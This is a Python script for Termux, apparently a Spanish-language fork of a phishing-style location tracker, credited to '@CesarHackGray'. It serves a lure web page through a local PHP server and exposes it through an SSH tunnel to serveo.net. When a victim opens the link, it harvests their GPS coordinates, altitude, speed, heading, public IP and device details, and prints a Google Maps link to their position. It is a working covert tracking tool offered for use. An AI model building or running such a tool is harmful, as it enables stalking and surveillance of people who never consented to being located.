#!/usr/bin/env python
# -*- coding: utf-8 -*-
from __future__ import print_function

import os
import sys
import time
import json
import requests
import subprocess as subp

R = '\033[1;31m' # red
G = '\033[1;32m' # green
C = '\033[36m' # cyan
W = '\033[0m'  # white

swdstring = os.path.realpath(__file__)
swdlist = [i for i in swdstring]
swdlist = swdlist[::-1]
swdlist = swdlist[17:]
swdlist = swdlist[::-1]
swd = ''.join(swdlist)


result = '/data/data/com.termux/files/home/GPS-location/Gray/nearyou/php/result.txt'.format(swd)
info = '/data/data/com.termux/files/home/GPS-location/Gray/nearyou/php/info.txt'.format(swd)
site = 'nearyou'
ver = '1.1.1'

if sys.version_info[0] >= 3:
    raw_input = input

def banner():
	os.system('clear')
	print (C +
	r'''  ______ ______ _       _                            _
 / _____|_____ \ |     | |                      _   (_)
| /  ___ _____) ) \ ___| |      ___   ____ ____| |_  _  ___  ____
| | (___)  ____/ \ (___) |     / _ \ / ___) _  |  _)| |/ _ \|  _ \
| \____/| |  _____) )  | |____| |_| ( (__( ( | | |__| | |_| | | | |
 \_____/|_| (______/   |_______)___/ \____)_||_|\___)_|\___/|_| |_|''' + W)
	print ( R + '                   Created By ' + R + '@CesarHackGray')
	print (R + '                            GPS'      '\n' )

def network():
	try:
		requests.get('https://github.com/', timeout = 5)
		print (G + '[+]' + C + ' Comprobando la conexión a internet....' + W, end='')
		print (G + ' Cargando' + W + '\n')
	except requests.ConnectionError:
		print (R + '[!]' + C + ' Usted no está conectado a Internet ... Deja de fumar...' + W)
		sys.exit()

def version():
	print (G + '[+]' + C + ' Comprobación de actualizaciones del buscador...' + W, end='')
	update = requests.get('https://raw.githubusercontent.com/thewhiteh4t/seeker/master/version.txt', timeout = 5)
	update = update.text.split(' ')[1]
	update = update.strip()

	if update != ver:
		print ('\n\n' + G + '[!]' + C + ' Una nueva version esta disponible : ' + W + update)
		ans = raw_input('\n' + G + '[!]' + C + ' Update ? [y/n] : ' + W)
		if ans == 'y':
			print ('\n' + G + '[+]' + C + ' Actualizando...' + W + '\n')
			subp.check_output(['git', 'reset', '--hard', 'origin/master'])
			subp.check_output(['git', 'pull'])
			print ('\n' + G + '[+]' + C + ' Script actualizado... Por favor, vuelva a ejecutar...')
			sys.exit()
		elif ans == 'n':
			pass
		else:
			print ('\n' + R + '[-]' + C + ' Carácter inválido ... Saltar...'+ W)
	else:
		print (G + ' @CesarHackGray' + W)

def serveo():
	global api, site, swd
	flag = False
	print ('\n' + G + '[+]' + C + ' Iniciando el servidor PHP...' + W)
	with open ('php.log', 'w') as phplog:
		subp.Popen(['php', '-S', '127.0.0.1:8080', '-t', '/data/data/com.termux/files/home/GPS-location/Gray/'.format(swd)], stderr=phplog, stdout=phplog)

	print ('\n' + G + '[+]' + C + ' Obteniendo la URL de Serveo...' + W + '\n')
	with open ('serveo.txt', 'w') as tmpfile:
		proc = subp.Popen(['ssh', '-oStrictHostKeyChecking=no', '-R', '80:localhost:8080', 'serveo.net'], stdout = tmpfile, stderr = tmpfile, stdin = subp.PIPE)

	while True:
		time.sleep(2)
		with open ('serveo.txt', 'r') as tmpfile:
			try:
				stdout = tmpfile.readlines()
				if flag == False:
					for elem in stdout:
						if 'HTTP' in elem:
							elem = elem.split(' ')
							url = elem[4].strip()
							url = url + '/{}/'.format(site)
							print (G + '[+]' + C + ' URL : ' + W + url)
							flag = True
						else:
							pass
				elif flag == True:
					break
			except Exception as e:
				print (e)
				pass

def wait():
	printed = False
	while True:
		time.sleep(2)
		size = os.path.getsize(result)
		if size == 0 and printed == False:
			print('\n' + G + '[+]' + C + ' Esperando la interacción del usuario...' + W + '\n')
			printed = True
		if size > 0:
			main()

def main():
	global result
	try:
		with open (info, 'r') as file2:
			file2 = file2.read()
			json3 = json.loads(file2)
			for value in json3['dev']:
				print (G + '[+]' + C + ' Device Information : ' + W + '\n')
				print (G + '[+]' + C + ' OS         : ' + W + value['os'])
				print (G + '[+]' + C + ' Platform   : ' + W + value['platform'])
				try:
					print (G + '[+]' + C + ' CPU Cores  : ' + W + value['cores'])
				except TypeError:
					pass
				print (G + '[+]' + C + ' RAM        : ' + W + value['ram'])
				print (G + '[+]' + C + ' GPU Vendor : ' + W + value['vendor'])
				print (G + '[+]' + C + ' GPU        : ' + W + value['render'])
				print (G + '[+]' + C + ' Resolución : ' + W + value['wd'] + 'x' + value['ht'])
				print (G + '[+]' + C + ' Navegador  : ' + W + value['browser'])
				print (G + '[+]' + C + ' IP publica : ' + W + value['ip'])
	except ValueError:
		pass

	try:
		with open (result, 'r') as file:
			file = file.read()
			json2 = json.loads(file)
			for value in json2['info']:
				lat = value['lat']
				lon = value['lon']
				acc = value['acc']
				alt = value['alt']
				dir = value['dir']
				spd = value['spd']

				print ('\n' + G + '[+]' + C + ' Información sobre la ubicación : ' + W + '\n')
				print (G + '[+]' + C + ' Latitud    : ' + W + lat + C + ' deg')
				print (G + '[+]' + C + ' Longitud   : ' + W + lon + C + ' deg')
				print (G + '[+]' + C + ' Exactitud  : ' + W + acc + C + ' m')

				if alt == '':
					print (R + '[-]' + C + ' Altitud    : ' + W + 'No disponible')
				else:
					print (G + '[+]' + C + ' Altitud    : ' + W + alt + C + ' m')

				if dir == '':
					print (R + '[-]' + C + ' Dirección  : ' + W + 'No disponible')
				else:
					print (G + '[+]' + C + ' Dirección  : ' + W + dir + C + ' deg')

				if spd == '':
					print (R + '[-]' + C + ' Velocidad  : ' + W + 'No disponible')
				else:
					print (G + '[+]' + C + ' Velocidad  : ' + W + spd + C + ' m/s')
	except ValueError:
		error = file
		print ('\n' + R + '[-] ' + W + error)
		repeat()

	def maps():
		print ('\n' + G + '[+]' + C + ' Google Maps : ' + W + 'https://www.google.com/maps/place/' + lat + '+' + lon)
		repeat()
	maps()

def clear():
	global result
	with open (result, 'w+'): pass
	with open (info, 'w+'): pass

def repeat():
	clear()
	wait()
	main()

def quit():
	global result
	with open (result, 'w+'): pass
	os.system('pkill php')
	sys.exit()

try:
	banner()
	network()
	version()
	serveo()
	wait()
	main()

except KeyboardInterrupt:

	print ('\n' + R + '[!]' + C + ' Hola soy César gracias por usar mi herramienta.' + W )
        print ('\n')
        
	quit()
